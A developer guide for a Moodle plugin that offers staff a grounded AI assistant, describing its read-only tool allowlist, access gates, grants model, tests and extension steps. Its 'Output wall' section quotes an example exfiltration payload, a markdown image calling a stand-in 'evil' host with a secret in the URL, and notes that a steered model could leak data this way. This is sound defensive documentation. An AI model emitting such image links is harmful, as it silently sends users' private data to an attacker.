# Developer guide — AI Teacher Assistant (`local_groundedai`)

A short map of how the plugin is built, the invariants that must not break, and how to extend it.

## What it is

A staff-only assistant that answers questions grounded **only** in Moodle data the asking staff member
may already see. The model never touches Moodle data directly: it may only call a fixed allowlist of
**read** tools, each of which re-checks the caller's own capability and course scope. There is no write
path anywhere in the request flow.

## Request flow

```
staff.php (UI)  ──AJAX──▶  classes/external/send_message.php
                                   │
                                   ▼
                     classes/local/conversation.php ── persists the turn, builds history
                                   │
                                   ▼
                     classes/local/staff_assistant.php ── builds the system prompt, runs the
                                   │                       tool-call loop, enforces access
                                   ├─▶ classes/local/staff/tools.php ── the read-tool allowlist
                                   └─▶ classes/local/provider_facade.php ── the OpenAI-compatible call
```

`staff_assistant::answer()` is the entry point. Before anything else it calls
`access_manager::assert_no_forbidden_access()` (halts if a student/guest role ever holds a grant) and
`access_manager::can_use($userid)`, and it fires the `assistant_queried` / `access_denied` events.

## The read-only wall (do not weaken)

- **Fixed allowlist.** `tools::dispatch()` is a hard `switch`; a name not in it returns an error. Every
  handler issues SELECT-only reads or high-level read APIs. No `insert`/`update`/`delete`/`set_field`/
  write-trigger is reachable from a staff query. `tests/adversarial_test.php` asserts this.
- **One gate.** Data tools call `tools::gate($domain, $domains, $courseid, $userid, $capability = null)`,
  which checks: the domain is enabled for this grantee; the course exists; `can_access_course()`;
  `scope_blocks()` (the grant's course scope); and optionally a course capability. It returns the course
  and context, or a recoverable `['error' => ...]` the tool returns verbatim. **New data tools must go
  through `gate()`** so the wall stays identical everywhere.
- **Capability re-check in context.** Even past the gate, each tool re-checks the specific capability
  (e.g. `moodle/grade:viewall`) in the item's own context, and honours separate groups.
- **Secrets.** The provider API key lives only in `local_groundedai/apikey` and is used solely as a
  Bearer header in `provider_facade`. It must never reach a log, event, the evidence pack, CSV, or the
  client.
- **Output wall.** Model output is rendered by `conversation::render_assistant_html()`: `format_text`
  with HTML cleaning, then **remote `<img>` stripped** (the cleaner keeps images, which a steered model
  could use as a zero-click exfiltration channel — `![](https://evil/?d=secret)`), then http(s)-only
  autolinking. Never render model output without going through this method.

## The access-grants model

`classes/local/access_manager.php` + the `local_groundedai_grants` table. One row per grant:

- `granteetype` = `role` or `user`, with `roleid`/`userid`.
- `coursescope` = `all` / `enrolled` / `course`, with `courseid` for a specific-course grant (one row
  per course).
- `domains` and `features` — per-grant CSVs (data domains default on; sensitive features default off).
- `expiry` — 0 (never) or a timestamp (stored as the end of the chosen day).

Resolution is a **union** across a user's active, non-expired grants: `enabled_domains()`,
`feature_enabled()`, `effective_course_access()`. Admins get everything; students/guests nothing.
`FORBIDDEN_ARCHETYPES` (student/guest/user/frontpage) are structurally non-grantable, and
`assert_no_forbidden_access()` halts the assistant if one is ever present (ignoring expiry).

Grants are edited on `governance.php` via `grant_edit.php` + `classes/form/grant_form.php`; each change
fires the `grant_changed` event into the standard log store (ids only).

## Directory map

| Path | What |
|---|---|
| `staff.php`, `preferences.php` | The staff UI and per-user preferences. |
| `governance.php`, `grant_edit.php` | Governance console: grants, access log, evidence pack. |
| `settings.php` | One admin category → Setup + Governance pages. |
| `classes/local/` | Core: `access_manager`, `staff_assistant`, `staff/tools`, `provider_facade`, `conversation`, `evidence`, `policy`, `compliance_map`, extractors, `telemetry`. |
| `classes/external/` | Web services (send/get/manage conversations, upload). |
| `classes/event/` | `assistant_queried`, `access_denied`, `grant_changed`. |
| `classes/task/` | `cleanup_conversations` (scheduled), `extract_text` (adhoc). |
| `classes/privacy/provider.php` | Full GDPR provider (metadata, export, delete). |
| `db/` | `install.xml`, `upgrade.php`, `access.php` (capabilities), `hooks.php`, `tasks.php`. |
| `thirdparty/pdfparser/` | Vendored PDF text extractor (declared in `thirdpartylibs.xml`). |
| `tests/` | PHPUnit suite (see below). |

## Running the tests

```bash
# One-time (and after any version bump): regenerate the PHPUnit config.
php admin/tool/phpunit/cli/init.php
# Run just this plugin's suite.
php vendor/bin/phpunit --testsuite local_groundedai_testsuite
```

`tests/adversarial_test.php` is the read-only-wall proof; `tests/accesswall_regression_test.php` locks
in the course-scope and audit-trail fixes. Keep both green.

## Adding a read tool

1. Add the tool's JSON schema in `tools::schemas()`, gated on its data domain so it is only offered when
   the grantee's grants enable that domain.
2. Add a `case` in `tools::dispatch()` routing the name to a handler.
3. Write the handler as `protected static function my_tool(array $args, int $userid, array $domains)`.
   Start with `self::gate(...)`, read with SELECT-only / high-level read APIs, cap result sizes, and
   build compact id-based rows (use `with_names()` to resolve names in one query). Return an array, or
   `['error' => '...']` for a recoverable refusal.
4. Add a test, and extend `adversarial_test.php` if the tool opens a new data path.

## Conventions

- No external project codenames in shipped code; the telemetry target is a generic "configured OTLP
  endpoint".
- Read tools stay lean (server-side aggregates, caps, few queries) to keep server and token cost low.
- All user-facing strings come from `lang/en/local_groundedai.php`; never strict-compare a Moodle DB
  enum (e.g. group mode) against an int constant — they come back as strings.
